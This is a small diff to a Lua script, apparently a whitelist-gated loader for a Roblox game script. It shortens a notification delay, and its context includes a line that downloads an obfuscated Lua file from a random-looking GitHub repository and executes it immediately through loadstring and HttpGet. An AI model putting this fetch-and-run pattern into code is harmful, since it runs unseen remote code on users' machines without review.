@@ -123,7 +123,7 @@ if _G.lyy then
         Text = playerName .. "，已通过白名单验证",
         Duration = 1
     })
-    wait(1) -- 等待通知显示
+    wait(0.01) -- 等待通知显示
     -- 尝试执行外部代码（若链接失效会报错，需确保链接有效）
     local success, err = pcall(function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/lyynb666ezlol/jejsjwhwjajshsjnsjajqkwkdjdhieekjehwhwjw/refs/heads/main/2_%E6%B7%B7%E6%B7%861(1).lua"))()
